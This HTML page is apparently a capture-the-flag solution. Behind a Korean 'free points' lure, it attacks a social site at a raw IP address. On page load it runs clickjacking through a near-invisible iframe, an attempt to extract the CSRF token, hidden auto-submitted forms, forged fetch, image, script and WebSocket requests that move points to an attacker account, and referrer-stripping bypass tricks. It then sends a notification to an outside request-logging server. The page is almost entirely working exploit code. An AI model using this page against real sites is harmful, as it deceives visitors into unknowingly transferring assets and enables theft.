<!DOCTYPE html>
<html>
<head>
    <title>ğŸ ë¬´ë£Œ í¬ì¸íŠ¸ ë°›ê¸°!</title>
    <meta charset="utf-8">
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            margin: 0;
        }
        .gift-box {
            background: white;
            color: #333;
            padding: 50px;
            border-radius: 20px;
            max-width: 500px;
            margin: 0 auto;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: fadeIn 0.5s;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }
        h1 {
            color: #667eea;
            font-size: 2.5em;
            margin-bottom: 20px;
        }
        .gift-icon {
            font-size: 100px;
            animation: bounce 1s infinite;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 20px 50px;
            font-size: 1.2em;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 20px;
            transition: transform 0.2s;
        }
        button:hover {
            transform: scale(1.1);
        }
        .clickjacking-container {
            position: relative;
            width: 300px;
            height: 100px;
            margin: 20px auto;
        }
        .legitimate-button {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 2;
            opacity: 0.001;
            cursor: pointer;
        }
        #status {
            background: #f0f0f0;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            color: #667eea;
            font-weight: bold;
            min-height: 60px;
        }
    </style>
</head>
<body>
    <div class="gift-box">
        <div class="gift-icon">ğŸ</div>
        <h1>ğŸ‰ ì¶•í•˜í•©ë‹ˆë‹¤!</h1>
        <p style="font-size: 1.5em;">10,000 í¬ì¸íŠ¸ë¥¼ ë°›ìœ¼ì…¨ìŠµë‹ˆë‹¤!</p>
        <div id="status">ìë™ìœ¼ë¡œ í¬ì¸íŠ¸ë¥¼ ë°›ëŠ” ì¤‘...</div>
        
        <!-- Clickjacking ê³µê²© -->
        <div class="clickjacking-container">
            <button>ğŸ’° í¬ì¸íŠ¸ ë°›ê¸° ğŸ’°</button>
            <iframe class="legitimate-button" 
                    src="http://3.34.181.145/profile.php?send_gift=1&receiver_id=1&points=10000"
                    frameborder="0">
            </iframe>
        </div>
    </div>
    
    <div id="csrfForms" style="display:none;"></div>
    
    <script>
        const ATTACKER_ID = '1';
        const TARGET_SNS = 'http://3.34.181.145';
        const ATTACK_SERVER = 'https://enxzoji.request.dreamhack.games';
        
        // 1. CSRF í† í° ì¶”ì¶œ ì‹œë„
        async function tryExtractCSRFToken() {
            console.log('[*] Attempting CSRF token extraction...');
            
            // Method 1: XHR with credentials
            try {
                const xhr = new XMLHttpRequest();
                xhr.open('GET', TARGET_SNS + '/profile.php', false);
                xhr.withCredentials = true;
                xhr.send();
                // ì‘ë‹µ ìƒíƒœ í™•ì¸
                if (xhr.status === 200) {
                    const match = xhr.responseText.match(/csrf_token['"]\s*value=['"]([^'"]+)/);
                    if (match) {
                        console.log('[+] CSRF token found:', match[1]);
                        return match[1];
                    }
                }
            } catch(e) {
                console.log('[-] XHR method failed:', e);
            }
            
            // Method 2: Fetch with no-cors
            try {
                const response = await fetch(TARGET_SNS + '/profile.php', {
                    credentials: 'include',
                    mode: 'no-cors'
                });
                // Can't read response in no-cors mode, but request is sent
            } catch(e) {
                console.log('[-] Fetch method failed:', e);
            }
            
            // Method 3: Image tag with error handler
            const img = new Image();
            img.src = TARGET_SNS + '/profile.php?csrf_token_check=1';
            
            return null;
        }
        
        // 2. ë‹¤ì–‘í•œ CSRF ê¸°ë²•
        async function executeAdvancedCSRF() {
            console.log('[*] Starting advanced CSRF attacks...');
            
            // ê¸°ë²• 1: ì „í†µì ì¸ Form ì œì¶œ
            function classicFormCSRF() {
                const amounts = [5000, 3000, 1000, 500, 300, 100];
                let formHTML = '';
                
                amounts.forEach((amount, index) => {
                    formHTML += `
                        <form id="csrfForm${index}" method="POST" action="${TARGET_SNS}/profile.php" target="iframe${index}">
                            <input type="hidden" name="send_gift" value="1">
                            <input type="hidden" name="receiver_id" value="${ATTACKER_ID}">
                            <input type="hidden" name="gift_type" value="diamond">
                            <input type="hidden" name="points" value="${amount}">
                            <input type="hidden" name="message" value="Gift ${amount}P">
                        </form>
                        <iframe id="iframe${index}" name="iframe${index}" style="display:none"></iframe>
                    `;
                });
                
                document.getElementById('csrfForms').innerHTML = formHTML;
                
                amounts.forEach((amount, index) => {
                    setTimeout(() => {
                        document.getElementById('csrfForm' + index).submit();
                        console.log('[+] Form CSRF:', amount + 'P');
                    }, index * 300);
                });
            }
            
            // ê¸°ë²• 2: XHR/Fetch CSRF
            async function xhrCSRF() {
                console.log('[*] Trying XHR CSRF...');
                
                // FormData CSRF
                const formData = new FormData();
                formData.append('send_gift', '1');
                formData.append('receiver_id', ATTACKER_ID);
                formData.append('points', '10000');
                
                try {
                    await fetch(TARGET_SNS + '/profile.php', {
                        method: 'POST',
                        body: formData,
                        credentials: 'include',
                        mode: 'no-cors'
                    });
                    console.log('[+] FormData CSRF sent');
                } catch(e) {
                    console.log('[-] FormData CSRF failed:', e);
                }
                
                // JSON CSRF
                try {
                    await fetch(TARGET_SNS + '/api/transfer', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            receiver_id: ATTACKER_ID,
                            points: 10000
                        }),
                        credentials: 'include',
                        mode: 'no-cors'
                    });
                    console.log('[+] JSON CSRF sent');
                } catch(e) {
                    console.log('[-] JSON CSRF failed:', e);
                }
                
                // URL-encoded CSRF
                try {
                    await fetch(TARGET_SNS + '/profile.php', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                        body: 'send_gift=1&receiver_id=' + ATTACKER_ID + '&points=10000',
                        credentials: 'include',
                        mode: 'no-cors'
                    });
                    console.log('[+] URL-encoded CSRF sent');
                } catch(e) {
                    console.log('[-] URL-encoded CSRF failed:', e);
                }
            }
            
            // ê¸°ë²• 3: GET ê¸°ë°˜ CSRF
            function getCSRF() {
                console.log('[*] Trying GET CSRF...');
                
                // Image tags
                const img1 = new Image();
                img1.src = TARGET_SNS + '/profile.php?send_gift=1&receiver_id=' + ATTACKER_ID + '&points=5000';
                
                // Script tags
                const script = document.createElement('script');
                script.src = TARGET_SNS + '/profile.php?action=transfer&to=' + ATTACKER_ID + '&amount=5000';
                document.body.appendChild(script);
                
                // Link prefetch
                const link = document.createElement('link');
                link.rel = 'prefetch';
                link.href = TARGET_SNS + '/profile.php?gift=' + ATTACKER_ID;
                document.head.appendChild(link);
                
                console.log('[+] GET CSRF elements injected');
            }
            
            // ê¸°ë²• 4: ì›¹ì†Œì¼“ CSRF
            function websocketCSRF() {
                try {
                    const ws = new WebSocket('ws://' + TARGET_SNS.replace('http://', '') + '/ws');
                    ws.onopen = function() {
                        ws.send(JSON.stringify({
                            action: 'transfer',
                            to: ATTACKER_ID,
                            amount: 10000
                        }));
                        console.log('[+] WebSocket CSRF sent');
                    };
                } catch(e) {
                    console.log('[-] WebSocket CSRF failed:', e);
                }
            }
            
            // ì‹¤í–‰
            const token = await tryExtractCSRFToken();
            
            classicFormCSRF();
            await xhrCSRF();
            getCSRF();
            websocketCSRF();
            
            // ê³µê²© ë¡œê¹…
            fetch(ATTACK_SERVER + '/notify?event=advanced_csrf_executed&techniques=form,xhr,get,websocket')
                .catch(() => {});
        }
        
        // 3. ë°©ì–´ ìš°íšŒ ê¸°ë²•
        function bypassDefenses() {
            // Referer í—¤ë” ìš°íšŒ
            const meta = document.createElement('meta');
            meta.name = 'referrer';
            meta.content = 'no-referrer';
            document.head.appendChild(meta);
            
            // X-Frame-Options ìš°íšŒ ì‹œë„
            if (window.top !== window.self) {
                try {
                    window.top.location = window.self.location;
                } catch(e) {
                    // Clickjacking ê°€ëŠ¥
                }
            }
            
            // SameSite ì¿ í‚¤ ìš°íšŒ (POST -> GET ë³€í™˜)
            // Modern browsers block this, but try anyway
        }
        
        // 4. ì‹¤í–‰
        window.onload = function() {
            console.log('[*] Advanced CSRF attack page loaded');
            
            // ë°©ì–´ ìš°íšŒ
            bypassDefenses();
            
            // ê³µê²© ì‹¤í–‰
            setTimeout(() => {
                executeAdvancedCSRF();
            }, 1000);
            
            // UI ì—…ë°ì´íŠ¸
            document.getElementById('status').innerHTML = 'ğŸ¯ í¬ì¸íŠ¸ ì „ì†¡ ì¤‘...';
            
            setTimeout(() => {
                document.getElementById('status').innerHTML = 'âœ… ì™„ë£Œ! í¬ì¸íŠ¸ê°€ ê³§ ì§€ê¸‰ë©ë‹ˆë‹¤.';
            }, 5000);
        };
    </script>
</body>
</html>